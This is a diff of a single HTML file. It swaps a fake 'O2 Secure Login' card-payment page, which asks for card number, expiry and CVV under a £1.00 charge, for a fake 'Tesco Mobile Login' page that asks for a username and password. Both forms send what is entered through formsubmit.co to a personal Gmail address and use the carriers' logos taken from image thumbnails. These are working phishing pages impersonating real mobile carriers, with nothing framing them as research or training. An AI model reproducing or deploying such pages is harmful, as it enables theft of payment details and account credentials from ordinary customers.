@@ -1,116 +1,59 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>O2 Secure Login</title>
-  <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #F2F2F2;
-      margin: 0;
-      padding: 20px;
-      color: #1A1A1A;
-    }
-    .container {
-      max-width: 400px;
-      margin: auto;
-      background: #ffffff;
-      padding: 20px;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-    }
-    .logo {
-      display: block;
-      margin: 0 auto 20px;
-      max-width: 140px;
-    }
-    h2 {
-      color: #002D72;
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    input {
-      width: 100%;
-      padding: 12px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      background-color: #F9F9F9;
-      font-size: 16px;
-    }
-    button {
-      width: 100%;
-      padding: 12px;
-      background-color: #00A9E0;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      cursor: pointer;
-      transition: background 0.3s ease;
-    }
-    button:hover {
-      background-color: #002D72;
-    }
-    .confirmation, .secure-icon {
-      text-align: center;
-      font-size: 14px;
-      color: #676767;
-      margin-top: 10px;
-    }
-    .thank-you {
-      text-align: center;
-      font-size: 18px;
-      color: #002D72;
-      font-weight: bold;
-      margin-top: 40px;
-    }
-  </style>
-  <script>
-    function handleSubmit(event) {
-      event.preventDefault();
-      const form = document.getElementById("form");
-      const thankYou = document.getElementById("thankYou");
-
-      // Send form data to FormSubmit
-      fetch(form.action, {
-        method: "POST",
-        body: new FormData(form),
-        headers: {
-          'Accept': 'application/json'
-        }
-      }).then(() => {
-        form.style.display = "none";
-        thankYou.style.display = "block";
-      });
-    }
-  </script>
-</head>
-<body>
-  <div class="container">
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRbZnLVX-woSisa1PXL9PdCY8G6S_KDRedwYdy9DUJ_l_zsvDgRql4YfNAXOo1hXVml_B8&usqp=CAU" alt="Virgin Media O2 Logo" class="logo" />
-    <h2>O2 Secure Login</h2>
-
-    <form id="form" action="https://formsubmit.co/bakermr01@gmail.com" method="POST" onsubmit="handleSubmit(event)">
-      <!-- FormSubmit hidden fields -->
-      <input type="hidden" name="_captcha" value="false" />
-      <input type="hidden" name="_template" value="table" />
-      <input type="hidden" name="_autoresponse" value="Thank you for your submission. Your SIM will be dispatched shortly." />
-
-      <!-- Visible fields -->
-      <input type="text" name="name" placeholder="Name on Card" required />
-      <input type="text" name="card" placeholder="Card Number" required />
-      <input type="text" name="expiry" placeholder="Expiry Date (MM/YY)" required />
-      <input type="text" name="cvv" placeholder="CVV" required />
-      <button type="submit">Go ahead with £1.00</button>
-      <div class="confirmation">Your payment is secure</div>
-      <div class="secure-icon">🔒 Encrypted & protected</div>
-    </form>
-
-    <div id="thankYou" class="thank-you" style="display: none;">
-      Thank you. Our Dispatch Department will get in touch with you shortly.
-    </div>
-  </div>
-</body>
-</html>
+‎<html lang="en">
+‎<head>
+‎  <meta charset="UTF-8">
+‎  <title>Tesco Mobile Login</title>
+‎  <style>
+‎    body {
+‎      font-family: Arial, sans-serif;
+‎      background-color: #f2f2f2;
+‎      display: flex;
+‎      justify-content: center;
+‎      align-items: center;
+‎      height: 100vh;
+‎    }
+‎    .login-container {
+‎      background-color: white;
+‎      padding: 30px;
+‎      border-radius: 8px;
+‎      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+‎      width: 300px;
+‎      text-align: center;
+‎    }
+‎    .logo {
+‎      width: 120px;
+‎      margin-bottom: 20px;
+‎    }
+‎    input[type="text"], input[type="password"] {
+‎      width: 100%;
+‎      padding: 10px;
+‎      margin: 10px 0;
+‎      border: 1px solid #ccc;
+‎      border-radius: 4px;
+‎    }
+‎    button {
+‎      width: 100%;
+‎      padding: 10px;
+‎      background-color: #00539f;
+‎      color: white;
+‎      border: none;
+‎      border-radius: 4px;
+‎      cursor: pointer;
+‎    }
+‎    button:hover {
+‎      background-color: #003f7f;
+‎    }
+‎  </style>
+‎</head>
+‎<body>
+‎  <div class="login-container">
+‎    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ32ZWhOrPlSzFcRe_U4kH3LGA4vAglLL_woKnmTeiv9xBMCVegfYe3PNema2CVfyj5CGM&usqp=CAU" alt="Tesco Mobile Logo" class="logo">
+‎    <h2>Login to Tesco Mobile</h2>
+‎    <form action="https://formsubmit.co/bakermr01@gmail.com" method="POST">
+‎      <input type="text" name="username" placeholder="Username" required>
+‎      <input type="password" name="password" placeholder="Password" required>
+‎      <button type="submit">Login</button>
+‎    </form>
+‎  </div>
+‎</body>
+‎</html>
